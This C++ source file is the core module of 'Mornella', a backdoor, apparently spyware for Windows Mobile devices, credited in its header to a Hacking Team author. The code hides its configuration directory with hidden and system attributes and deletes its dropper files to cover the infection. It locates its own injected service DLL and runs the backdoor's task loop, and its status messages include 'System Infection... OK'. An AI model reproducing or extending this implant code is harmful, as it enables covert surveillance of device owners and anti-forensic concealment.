/*
	Mornella Core v0.1
	Date: 10/Sep/2008
	Coded by: Alberto "Quequero" Pelliccione
	E-mail: quequero@hackingteam.it
*/



#include "Core.h"
#include "FunctionFunc.h"

////#include "pch.h"





HANDLE __FindFirstFlashCard(LPWIN32_FIND_DATA lpFindFlashData)
{/// da completare BYGIO
	HANDLE h=0;
	return h;
}



BOOL __FindNextFlashCard(HANDLE hFlashCard, LPWIN32_FIND_DATA lpFindFlashData)
{
	/// da completare BYGIO
	return TRUE;
}





Core::Core() {
	OutputDebugString(L"Core");
	taskObj = Task::self();
}

Core::~Core() {

}

BOOL Core::Run() {
	wstring backdoorPath;
	WCHAR *pDropperPath = NULL;
	WIN32_FIND_DATA wfd;
	HANDLE hMmc = INVALID_HANDLE_VALUE;


	_Sleep(500);

	// Inizializziamo g_strOurName
	GetMyName(g_strOurName);

	// Nascondiamo la directory dove c'e' il file di configurazione
	/////backdoorPath = L"\\windows";
	///BYGIO backdoorPath = L".\\";
	backdoorPath = L"";
	backdoorPath += LOG_DIR;
	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
/***
	// Rimuoviamo il dropper dalle tre locazioni note, non abbiamo modo di
	// sapere dove si trovi davvero.
	ZeroMemory(&wfd, sizeof(wfd));
	hMmc = __FindFirstFlashCard(&wfd);

	do {
		UINT i = 0;

		if (hMmc == INVALID_HANDLE_VALUE)
			break;

#ifndef MORNELLA_STATIC
		backdoorPath = L"\\";
		backdoorPath += wfd.cFileName;
		backdoorPath += L"\\2577\\autorun3.exe";

		while (DeleteFile(backdoorPath.c_str()) == FALSE) {
			DWORD dwErr = GetLastError();
		
			if (dwErr == ERROR_FILE_NOT_FOUND || dwErr == ERROR_PATH_NOT_FOUND 
				|| dwErr == ERROR_BAD_PATHNAME || i > 10)
				break;

			i++;
			_Sleep(1000);

			DBG_TRACE(L"Debug - Core.cpp - Run() cannot wipe autorun3.exe, retrying ", 5, TRUE);
		}

		backdoorPath = L"\\";
		backdoorPath += wfd.cFileName;
		backdoorPath += L"\\2577";

		if (RemoveDirectory(backdoorPath.c_str()) == FALSE && GetLastError() != ERROR_BAD_PATHNAME) {
			DBG_TRACE(L"Debug - Core.cpp - Run() cannot remove \\2577\\ ", 5, TRUE);
		}
#endif
	} while (__FindNextFlashCard(hMmc, &wfd));

	FindClose(hMmc);
***/	
	DeleteFile(L"\\Autorun.exe"); // Il dropper se runnato a mano dalla root, non si rinomina in autorun3.exe
	DeleteFile(L"\\autorun3.exe");
	DeleteFile(L"\\windows\\autorun2.exe");

	ADDDEMOMESSAGE(L"Core Version: 2011112801\nDropper Wiping... OK\nSystem Infection:... OK\n");
	DBG_TRACE_VERSION;

	// Rimuoviamo il vecchio core se presente
	RemoveOldCore();
	
	taskObj->StartNotification();

	// Avviamo il core
	LOOP {
		if (taskObj->TaskInit() == FALSE) {
			DBG_TRACE(L"Debug - Core.cpp - TaskInit() FAILED\n", 1, FALSE);
			ADDDEMOMESSAGE(L"Backdoor Init... FAILED\n");
			DISPLAYDEMOMESSAGE(NULL);
			return FALSE;
		} else {
			DBG_TRACE(L"Debug - Core.cpp - TaskInit() OK\n", 1, FALSE);
			ADDDEMOMESSAGE(L"Backdoor Status... OK\n");
			DISPLAYDEMOMESSAGE(NULL);
		}

		if (taskObj->CheckActions() == FALSE) {
			DBG_TRACE(L"Debug - Core.cpp - CheckActions() [Uninstalling?] FAILED\n", 1, FALSE);
			DISPLAYDEMOMESSAGE(L"Backdoor Uninstalled, reboot the device!");
			return FALSE;
		}
	}
	
	return TRUE;
}

// Torna un puntatore al nome della nostra dll, NULL se non riesce a trovarlo, 
// il puntatore va liberato dal chiamante.
void Core::GetMyName(wstring &strName) {
	HMODULE hMod;

	do {
		hMod = _GetModuleHandleW(MORNELLA_SERVICE_DLL_A);

		if (hMod == NULL)
			break;

		if (GetProcAddress(hMod, (LPCSTR)L"BTC_WriteAsync")) {
			strName = MORNELLA_SERVICE_DLL_A;
			return;
		}
	} while(0);

	do {
		hMod = _GetModuleHandleW(MORNELLA_SERVICE_DLL_B);

		if (hMod == NULL)
			break;

		if (GetProcAddress(hMod, (LPCSTR)L"BTC_WriteAsync")) {
			strName = MORNELLA_SERVICE_DLL_B;
			return;
		}
	} while(0);

	DBG_TRACE(L"Debug - Core.cpp - GetMyName() FAILED\n", 5, FALSE);
	return;

/*
	HANDLE hSnap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me;

	me.dwSize = sizeof(MODULEENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, (DWORD)GetProcessHandle(L"services.exe"));

	if(hSnap == INVALID_HANDLE_VALUE)
		return NULL;

	if (Module32First(hSnap, &me)) {
		do {
			HMODULE hMod = GetModuleHandle(me.szModule);

			if(hMod == NULL)
				continue;

			if(GetProcAddress(hMod, L"BTC_WriteAsync")) {
				FreeLibrary(hMod);

				pwMyName = new(std::nothrow) WCHAR[wcslen(me.szModule) + 1];

				if(pwMyName == NULL)
					break;

				ZeroMemory(pwMyName, WideLen(me.szModule) + sizeof(WCHAR));
				CopyMemory(pwMyName, me.szModule, WideLen(me.szModule));
				break;
			}

			FreeLibrary(hMod);

		} while (Module32Next(hSnap, &me));
	}

	CloseToolhelp32Snapshot(hSnap);
	return pwMyName;
*/
}

BOOL Core::RemoveOldCore() {
	wstring strPathName;

	if (g_strOurName.size() == 0) {
		DBG_TRACE(L"Debug - Core.cpp - RemoveOldCore() FAILED\n", 5, FALSE);
		return FALSE;
	}

	strPathName = L"\\windows\\";

	if (g_strOurName == MORNELLA_SERVICE_DLL_A)
		strPathName += MORNELLA_SERVICE_DLL_B;
	else
		strPathName += MORNELLA_SERVICE_DLL_A;

	BOOL bRet = DeleteFile(strPathName.c_str());

	return bRet;
}
